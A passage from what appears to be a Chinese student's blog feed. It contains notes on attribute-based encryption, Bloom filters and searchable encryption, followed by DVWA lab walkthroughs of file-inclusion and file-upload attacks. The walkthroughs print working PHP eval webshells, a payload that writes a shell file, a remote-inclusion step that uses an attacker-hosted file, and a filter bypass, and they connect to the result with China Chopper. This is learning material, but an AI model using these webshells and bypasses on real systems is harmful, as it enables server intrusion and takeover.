alt="image1"></p><p>从根节点开始，其门限是2，孩子节点有3个，即需要有至少2个孩子节点才能得到源数据值；根节点随机生成一个多项式，其最高次数为门限值少1，故根节点的最高次数为1，然后将常数项设置为秘密数；比如此根节点随机的多项式为f(x)=5+3x，秘密数为5.此外将根节点的孩子节点从左往右依次标记为1,2,3,…….,将节点标记值带入f(x)函数中，所得值（即生成新的秘密值）传给该标记的的孩子节点秘密保存；故“3/3”节点标记为1，传给“3/3”节点的秘密值f(1)=5+31=8,中间“教师”节点标记为2，传给“教师”节点的秘密值f(2)=5+32=11,”1/2”节点标记为3，传给“1/2”节点的秘密值为f(3)=5+3*3=14。</p><p>“3/3”节点和“1/2”节点在接收到父节点传来的值后，按照上述方式生成随机多项式，将常数项设置为父节点传来的值，此外也按照上述方式生成新的秘密值并将它传给子节点；对于叶子节点，在接受到父节点的秘密值后，用此叶子节点的属性对秘密值进行加密处理。</p><h3 id="从访问树中解密出访问树的秘密数"><a href="#从访问树中解密出访问树的秘密数" class="headerlink" title="从访问树中解密出访问树的秘密数"></a>从访问树中解密出访问树的秘密数</h3><p>数据访问者需满足访问树方可解密出访问树的秘密值，对于上述访问树，数据访问者需满足以下属性集中的一个：（计算机学院、硕士、研二、教师）、（计算机学院、硕士、研二、网络实验室）、（计算机学院、硕士、研二、云实验室）、（教师、网络实验室）、（教师、云实验室）。若上述属性集中某一个或多个（至少一个）为数据访问者属性集的子集，则能解密出秘密值，下面开始解密处理。<br>对于叶子节点，在数据访问者属性集中寻找出和此节点属性与属性值一致的属性，用找出的属性解密出此节点的秘密值（即公式1），当然不能完全解密出，他是秘密值和加密时对此属性设置的加密值的乘积。</p><p>解密出叶子节点后，开始解密其父节点（非叶子节点），在解密出叶子节点后，即可得到多对值；如在上述访问树的“3/3”节点，其孩子节点解密出三个值19，44，83（推理过程忽略随机数），在生成这三个数时，f(1)=19，f(2)=44，f(3)=83，其中f(x)=8+4x+7x<sup>2</sup>（解密时并不知道此多项式，只知道后面的三个点），因此在f(x)上有三个点是（1，19），（2，44），（3，83）；因为此节点存储的秘密值是多项式的常数项，即f(0)=秘密值，故我们需要根据这三个点得到0所对应的值是多少，根据拉格朗日公式就能求出0所对应的值，即解密出秘密值（即公式2）；对于非叶子节点均可按照上述方式解密出秘密值，在根节点处解密出整个树所隐藏的秘密值（是秘密值和加密时对此属性设置的加密值的乘积，所有节点解密出的秘密都存在一个随机数，解密出的值都是随机数和秘密值的乘积，只是讲述过程中为了方便忽略了随机数，最后根节点解密出的随机数在最后的解密过程中会抵消掉（公式3））。</p><p>另外需要说明的是“3/3”节点是一个3个孩子节点、门限值为3的节点，相当于且关系，数据访问者需解密出所有的孩子节点方可用拉格朗日公式解密出常数项（即秘密值）；“1/2”节点是一个2个孩子节点、门限值为1的节点，故为或关系，数据访问者只满足其中一个孩子节点即可解密出秘密值（秘密值就是孩子节点解密出的秘密值，因为根据随机多项式生成规则，多项式的最高次数为门限值少1，门限值为1，故最高次数为0，即常数项）；若如“2/3”这样的节点，既非且关系，也非或关系，3个孩子节点，门限值为2，若需解密出此节点的秘密值，数据访问者需解密出三个孩子节点中的两个节点即可解密出孩子节点。</p><h2 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h2><p>当一个元素被加入集合时，通过多个哈希函数将元素映射到一个比特数组中的若干个位置，并把它们置为 1 ，查询时，只要看看这些位置是不是都是 1 就知道元素是否（可能）在集合中了：如果这些位置中有任意一个是 0，那么此元素一定不在集合中；如果都是 1，那么此元素可能在集合中，注意是「可能」在，也就是说「可能」不在，这被称作False positive。</p><p>如下图所示，字符串”Hello”被哈希函数映射到比特数组中索引为1和3的位置，布隆过滤器就会把这些位置置为1；</p><p><img src="/2021/10/22/VABKS-Verifiable-Attribute-based-Keyword-Search-over-Outsourced-Encrypted-Data%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image2.png" alt="image2"></p><p>然后接着在将字符串”Bloom”映射上来，如下图所示，字符串”Bloom”被哈希函数映射到比特数组中索引为1和2的位置，布隆过滤器也会把这些位置置为1.这样的话字符串”Hello”和”Bloom”映射的位置发生了”冲突”，索引为1的位置都为1了，这个问题不大，因为布隆过滤器使用的是多个哈希函数，查询的时候必须所有的哈希函数映射的索引位置都为1才行。</p><p><img src="/2021/10/22/VABKS-Verifiable-Attribute-based-Keyword-Search-over-Outsourced-Encrypted-Data%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image3.png" alt="image3"></p><p>但是这样会出现一个问题，如果比特数组长度不够大，那么随着新元素的不断加入，比特数组中的大部分索引位置都会被置为1，比如这里三个索引位置都为1了，后面再查询一个不存在的元素结果都为1，显示存在，就会出现误报率了。</p><p>可见，在使用布隆过滤器的时候，如果想得到一个可接受的无保留，那么首先要<strong>选择合适的哈希函数</strong>，其次要<strong>协调好哈希函数数量和比特数组大小之间的关系</strong>。</p><p>参考</p><p><u><code>https://blog.huoding.com/2020/06/22/825</code></u></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 论文研读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 研究生学习日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Privacy-Preserving Multi-Keyword Searchable Encryption for Distributed Systems——论文研读</title>
      <link href="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/"/>
      <url>/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="论文汇报"><a href="#论文汇报" class="headerlink" title="论文汇报"></a>论文汇报</h1><p>本周我看了一篇将可搜索加密运用到分布式存储上的一篇论文——<em><strong>《Privacy-Preserving Multi-Keyword Searchable Encryption for Distributed Systems》</strong></em>。这篇论文的技术要点主要是讲本文提出的一个子集判断策略和上次我看的<em><strong>Distributed Two-Trapdoor Public-Key Cryptosystem(DT-PKC)<em><strong>相结合起来，这样不仅可以在</strong></em>MW/MR</strong></em>上对加密数据进行多关键字搜索，而且还保证了数据和搜索模式的隐私性；并且为了防止KGA，里面还采用了多服务器架构，通过只允许授权服务器联合测试搜索令牌是否与存储的密文相匹配，加快了搜索相应，分担了工作负载，降低了密钥泄露风险。</p><h2 id="子集判断策略"><a href="#子集判断策略" class="headerlink" title="子集判断策略"></a>子集判断策略</h2><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image1.png" alt="image1"></p><p>对于一个通用集合<em><strong>W</strong></em>，这里来判断包含于该通用集合<em><strong>W</strong></em>中的两个子集合***W<sub>T</sub><em><strong>和</strong></em>W<sub>t</sub><em><strong>之间的包含关系，即</strong></em>W<sub>t</sub>***是否包含于W<sub>T</sub>之中。</p><p>对于拥有***$\mu$<em><strong>个关键字的集合</strong></em>W=<em>{$\omega$<sub>$\mu$-1</sub>,…,$\omega$<sub>0</sub>}<strong>，用一个十进制数来表示，并且该十进制数的二进制表示出来每一位都表示一个关键字的存在状态，若为1即表示包含该关键字，为0则不包含；同样的也这样表示</strong></em>W<sub>T</sub><em><strong>和</strong></em>W<sub>t</sub>***，接下来就是这个算法的执行过程：</p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image2.png" alt="image2"></p><p>并且当***W<sub>t</sub><em><strong>包含于</strong></em>W<sub>T</sub>***中时，该子集判断流程还可以优化为下面这个算法：</p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image3.png" alt="image3"></p><h2 id="SE-EPOM"><a href="#SE-EPOM" class="headerlink" title="SE-EPOM"></a>SE-EPOM</h2><p>本文提出的<em><strong>A Searchable Encryption based on Efficient Privacy-preserving Outsourced calculation framework with Multiple keys</strong></em>的大致流程如下：</p><ol><li><em><strong>KeyGen(1<sup>$\kappa$</sup>)</strong></em>$\to$(PK<sub>DP</sub>,SK<sub>DP</sub>,PK<sub>RU</sub>,SK<sub>RU</sub>,SK<sub>CP</sub>,SK<sub>IS</sub>)</li><li><em><strong>Store(PK<sub>DP</sub>,W<sub>T</sub>)</strong></em>$\to$SC</li><li>***Trapdoor(PK<sub>Ru</sub>,W<sub>t</sub>)$\to$***td</li><li>***Test(PK<sub>DP</sub>,SK<sub>CP</sub>,SK<sub>IS</sub>,PK<sub>RU</sub>,td,SC)$\to$***0/1</li></ol><h3 id="系统介绍"><a href="#系统介绍" class="headerlink" title="系统介绍"></a>系统介绍</h3><h4 id="成员介绍："><a href="#成员介绍：" class="headerlink" title="成员介绍："></a>成员介绍：</h4><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image4.png" alt="image4"></p><ul><li>KGC:受信任的KGC的任务是分发和管理系统中的公钥和私钥。</li><li>CP:CP有“无限”的数据存储空间，并存储和管理所有注册的RUs的外包数据。CP还以加密的形式存储所有中间结果和最终结果。此外，CP能够对加密数据执行某些计算。</li><li>IS: 组织的内部服务器进行部分计算，以协助CP处理搜索查询。实际上，IS可以被指定为组织中的服务器。</li><li>DP:每个数据提供者根据公共参数生成自己的公开和秘密密钥对，根据与文档相关的关键字计算可搜索密文，并将文档与可搜索密文一起存储在CP上。</li><li>RU:每个请求用户生成自己的基于DP的公开和秘密密钥对，并为感兴趣的特定关键字计算陷门。它对CP返回的搜索结果进行解密，获得满足搜索查询的文档的索引。</li></ul><h4 id="Detailed-Construction："><a href="#Detailed-Construction：" class="headerlink" title="Detailed Construction："></a>Detailed Construction：</h4><h5 id="KeyGen"><a href="#KeyGen" class="headerlink" title="KeyGen:"></a><em><strong>KeyGen:</strong></em></h5><ul><li><p>KGC运行<em><strong>DT-PKC</strong></em>中的KeyGen算法来得到<em><strong>the strong private key</strong></em> <em><strong>SK=$\lambda$</strong></em>,并且运行<strong>D<em>T-PKC</em></strong>中的<strong>S<em>Keys</em></strong>算法来得到两个<strong>p<em>artial strong private key</em></strong> <em><strong>SK<sup>(1)</sup>=$\lambda$ <sub>1</sub>,SK<sup>(2)</sup>=$\lambda$<sub>2</sub></strong></em>;初始化一个通用集合<strong>W</strong>。</p></li><li><p>最后公共参数<em><strong>PP=(W,$\mu$,N,g)</strong></em>,<strong>S<em>K<sub>CP</sub>=SK<sup>(1)</sup>=$\lambda$<sub>1</sub></em></strong>,<strong>S<em>K<sub>IS</sub>=SK<sup>(2)</sup>=$\lambda$<sub>2</sub></em></strong></p><p>​                        <em><strong>pk<sub>DP</sub>=(N,g,h<sub>DP</sub>),sk<sub>DP</sub>=$\theta$<sub>DP</sub></strong></em></p><p>​                        <em><strong>pk<sub>RU</sub>=(N,g,h<sub>RU</sub>),sk<sub>RU</sub>=$\theta$<sub>RU</sub></strong></em></p></li></ul><h5 id="Store"><a href="#Store" class="headerlink" title="Store:"></a><em><strong>Store:</strong></em></h5><p>这时一个或多个DP来上传自己的文件和相关的关键字集合<em><strong>W<sub>T</sub></strong></em>,用一个十进制数<em><strong>T</strong></em>来表示，其二进制表示为***(T<sub>$\mu$</sub>,…,T<sub>0</sub>)<em><strong>,最后运行</strong>D</em>T-PKC<em><strong>中的</strong>E</em>nc*<strong>算法得到结果</strong>[*T]<sub>pk<sub>DP</sub></sub>***并发送给CP。</p><h5 id="Trapdoor"><a href="#Trapdoor" class="headerlink" title="Trapdoor:"></a><em><strong>Trapdoor:</strong></em></h5><p>此时RU会根据自己想要查询的多个关键字相较于通用集合<em><strong>W</strong></em>生成一个关键字集合<em><strong>W<sub>t</sub></strong></em>,同上一步进行加密后得到结<em><strong>果[t]<sub>pk<sub>RU</sub></sub><em><strong>并发送给</strong></em>CP</strong></em>。</p><h5 id="Test"><a href="#Test" class="headerlink" title="Test:"></a>Test:</h5><p>最后的测试阶段有如下四步：</p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image5.png" alt="image5"></p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image6.png" alt="image6"></p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image7.png" alt="image7"></p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image8.png" alt="image8"></p><p>这里只是一个文档和它的关键字集合，如果RU的查询关键字集合是这个文档的关键字集合的子集，说明这个查询结果是正确的。类似的可以推广到多个文件和其对应的关键字集合中来。</p><p><strong>对于这一步我个人理解为查找的过程，因为本篇论文中只是给出了一个文件的匹配过程，如果上传的文件数量多的话这种查询方式的效率可能会很低。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 论文研读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 研究生学习日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞渗透攻击"><a href="#文件包含漏洞渗透攻击" class="headerlink" title="文件包含漏洞渗透攻击"></a>文件包含漏洞渗透攻击</h1><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image1.png" alt="image1"></p><p>进入靶机网页，</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image2.png" alt="image2"></p><p><a href="http://192.168.176.135/dvwa/vulnerabilities/fi/?page=include.php">http://192.168.176.135/dvwa/vulnerabilities/fi/?page=include.php</a></p><p>这里其实是将靶机目录/var/www/dvaw/vulnerabilities/fi/下的include.php文件传给index.php(即文件包含)</p><p>这种攻击的想法是将本机的某个病毒文件或其他服务器的某个病毒文件传给index.php并执行。</p><p>我们可以尝试一下将本机的其他文件包含给index.php，例如先在本机目录/var/www/dvaw/vulnerabilities/fi/下创建x.txt文件，然后将x.txt文件传给index.php</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image3.png" alt="image3"></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image4.png" alt="image4"></p><p>这里就显示了x.txt的内容<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image5.png" alt="image5"></p><h2 id="关于文件包含"><a href="#关于文件包含" class="headerlink" title="关于文件包含"></a>关于文件包含</h2><p>我们可以分为本机包含和外机包含，即将本机的文件传给某个文件就是本机包含，将其他服务器的文件传给某个文件就是外机包含。</p><h2 id="安全等级为low的文件包含漏洞渗透攻击"><a href="#安全等级为low的文件包含漏洞渗透攻击" class="headerlink" title="安全等级为low的文件包含漏洞渗透攻击"></a>安全等级为low的文件包含漏洞渗透攻击</h2><h3 id="本机包含攻击"><a href="#本机包含攻击" class="headerlink" title="本机包含攻击"></a>本机包含攻击</h3><p>将安全等级设置为low，进入文件包含查看后端代码</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image6.png" alt="image6"></p><p>找一张属性合适的图片，利用edjpgcom软件将一句话代码写入图片中</p><p><strong>写入过程</strong>：</p><p>将图片拖入edjpgcom.exe中，然后写入一句话木马</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image7.png" alt="image7"></p><p>该代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell20.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[yangge]);?&gt;&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p>意思是打开一个shell20.php,然后往里面写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[yangge]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写入完毕后，我们可以直接将该图片上传</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image8.png" alt="image8"></p><p>上传成功，复制上传的文件地址，然后开始文件包含</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image9.png" alt="image9"></p><p>文件包含成功，这个文件成功执行，我们可以在靶机的目录/var/www/dvaw/vulnerabilities/fi/下找到shell20.php</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image10.png" alt="image10"></p><p>我们可以在中国菜刀上输入这个shell20.php的地址<a href="http://192.168.176.135/dvwa/vulnerabilities/fi/shell20.php">http://192.168.176.135/dvwa/vulnerabilities/fi/shell20.php</a></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image11.png" alt="image11"></p><p>入侵成功！</p><h3 id="外机包含攻击"><a href="#外机包含攻击" class="headerlink" title="外机包含攻击"></a>外机包含攻击</h3><p>我们只需要搭建一个服务器，然后在服务器上上传病毒文件，在靶机网页上的文件包含那一块指向这个服务器的病毒文件地址就可以了</p><h4 id="Ubuntu-下Apache安装和配置"><a href="#Ubuntu-下Apache安装和配置" class="headerlink" title="Ubuntu 下Apache安装和配置"></a>Ubuntu 下Apache安装和配置</h4><p>安装apache，在命令行终端中输入一下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install apache2</span><br></pre></td></tr></table></figure><p>安装完成后，重启apache服务，在命令行终端中输入一下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure><p>apache安装完成后会自动在/var下建立一个名为www的目录，这就是Web目录，所有要能过浏览器访问的Web文件都要放到这个目录里。</p><p>我们可以在本机浏览器上登录该服务器</p><p>可以在url上输入<a href="http://localhost或者http//127.0.0.1%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%99%BB%E5%BD%95%E8%AF%A5%E6%9C%8D%E5%8A%A1%E5%99%A8">http://localhost或者http://127.0.0.1就可以登录该服务器</a></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image12.png" alt="image12"></p><p>或者在外部机器上输入本机IP地址就可以登录该服务器</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image13.png" alt="image13"></p><p>安装完毕我们在服务器机器上建立一个病毒文件</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image14.png" alt="image14"></p><p>我们建立了一个zym.txt文件，文件内容为</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image15.png" alt="image15"></p><p>我们在浏览器上打开这个文件并复制文件地址</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image16.png" alt="image16"></p><p>然后我们直接进入靶机服务器的文件包含，将index.php改为该地址，回车，执行完毕</p><p>我们可以在目录/var/www/dvaw/vulnerabilities/fi/下找到shell.php文件</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image17.png" alt="image17"></p><p>接下来在中国菜刀上输入该文件地址就入侵成功了！</p><h2 id="安全等级为medium的文件包含漏洞渗透攻击"><a href="#安全等级为medium的文件包含漏洞渗透攻击" class="headerlink" title="安全等级为medium的文件包含漏洞渗透攻击"></a>安全等级为medium的文件包含漏洞渗透攻击</h2><p>将安全级别设为medium，我们进入文件包含查看后端代码</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image18.png" alt="image18"></p><p>我们可以看到只是多了将http://或者https://替换为空，因此本机包含入侵还是可以正常进行，但是外机包含入侵会在url上多http://或者https://，我们如果像之前一样操作会使得地址缺失</p><p>于是我们在原先的地址<a href="http://192.168.176.129/zym.txt%E4%B8%8A%E5%B0%86http://%E6%94%B9%E4%B8%BAh**http://**ttp://%E6%88%96%E8%80%85htt**http://**p://%E7%AD%89%E7%AD%89%EF%BC%8C%E8%BF%99%E6%A0%B7%E9%9D%B6%E6%9C%BA%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%B0%86%E4%B8%AD%E9%97%B4%E7%9A%84http://%E6%94%B9%E4%B8%BA%E7%A9%BA%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E8%83%BD%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F%E5%B9%B6%E7%94%9F%E6%88%90shell20.php%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E5%85%A5%E4%BE%B5%E6%88%90%E5%8A%9F%E4%BA%86%EF%BC%81">http://192.168.176.129/zym.txt上将http://改为h**http://**ttp://或者htt**http://**p://等等，这样靶机会自动将中间的http://改为空，这样就能执行成功并生成shell20.php文件，然后入侵成功了！</a></p><h2 id="安全等级为high的文件包含漏洞渗透攻击"><a href="#安全等级为high的文件包含漏洞渗透攻击" class="headerlink" title="安全等级为high的文件包含漏洞渗透攻击"></a>安全等级为high的文件包含漏洞渗透攻击</h2><p>将安全级别设为high，我们进入文件包含查看后端代码</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image19.png" alt="image19"></p><p>可以看到由于指定了文件包含的文件名，因此我们的两种攻击方式全部失效，但是这种开发方式是很笨重的，不易于后期的修改。</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白，学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Web安全渗透学习"><a href="#Web安全渗透学习" class="headerlink" title="Web安全渗透学习"></a>Web安全渗透学习</h1><h2 id="安全渗透环境准备"><a href="#安全渗透环境准备" class="headerlink" title="安全渗透环境准备"></a>安全渗透环境准备</h2><p>对于前期的学习我们需要下载一个适于新手学习的靶机——owaspbwa，该靶机是基于linux系统的，下载地址为<a href="https://jaist.dl.sourceforge.net/project/owaspbwa/1.2/OWASP_Broken_Web_Apps_VM_1.2.7z">https://jaist.dl.sourceforge.net/project/owaspbwa/1.2/OWASP_Broken_Web_Apps_VM_1.2.7z</a></p><p>下载安装后，登入系统</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image1.png" alt="image1"></p><p>这里提示可以在浏览器的地址栏输入192.168.176.135来进入该网页，进入后用户名和密码都为默认的admin。</p><p>中国菜刀的下载地址为<a href="https://lanzous.com/id5jleh">https://lanzous.com/id5jleh</a></p><h3 id="文件上传漏洞渗透及防御的学习——安全级别为low"><a href="#文件上传漏洞渗透及防御的学习——安全级别为low" class="headerlink" title="文件上传漏洞渗透及防御的学习——安全级别为low"></a>文件上传漏洞渗透及防御的学习——安全级别为low</h3><p>进入后找到<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image2.png" alt="image2">，这里进行文件上传漏洞渗透及防御的学习。</p><p>点进去后找到这个<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image3.png" alt="image3"></p><p>可以设置安全级别，首先是级别最低的<em><strong>low</strong></em></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image4.png" alt="image4"></p><p>进入文件上传的界面，右下角有查看后端代码的选项，点进去查看</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image5.png" alt="image5"></p><p>可见一份比较简易的后端php代码，这里没有对文件的识别，本来这里是只能上传图片的，由于没有识别机制，故我们可以上传一些恶意的代码上去，比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;chopper&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>也可以简易成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[chopper]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[chopper]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这就是一句话木马，里面chopper为登录的变量名，采用POST方式我们可以直接在中国菜刀软件上进行对靶机的入侵；如果为REQUEST方式的话，我们就只能在url行上对靶机进行入侵。</p><p>由于这里安全级别很低，故我们能直接将这段恶意代码上传上去。</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image6.png" alt="image6"></p><p>可见恶意代码上传成功，我们复制这段地址*../../hackable/uploads/shell.php<em>在本页面上的url地址上去掉</em>*#**，然后加上这段地址，回车就能打开这份文件，但这个文件在网页上是不会显示什么的。</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image7.png" alt="image7"></p><p>打开后我们复制这个文件的绝对地址<a href="http://192.168.176.135/dvwa/hackable/uploads/shell.php%EF%BC%8C%E6%88%91%E4%BB%AC%E5%86%8D%E5%9C%A8%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E8%BD%AF%E4%BB%B6%E4%B8%8A%E6%89%93%E5%BC%80%E3%80%82">http://192.168.176.135/dvwa/hackable/uploads/shell.php，我们再在中国菜刀软件上打开。</a></p><p>下载好打开<strong>caidao.exe</strong><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image8.png" alt="image8"></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image9.png" alt="image9"></p><p>新建shell，地址为该文件的绝对地址，后面输入代码中设置的变量名<strong>chopper</strong></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image10.png" alt="image10"></p><p>这样就入侵成功！</p><h3 id="文件上传漏洞渗透及防御的学习——安全级别为medium"><a href="#文件上传漏洞渗透及防御的学习——安全级别为medium" class="headerlink" title="文件上传漏洞渗透及防御的学习——安全级别为medium"></a>文件上传漏洞渗透及防御的学习——安全级别为medium</h3><p>将安全级别调至medium</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image11.png" alt="image11"></p><p>此时再查看文件上传的后端代码</p><p><img 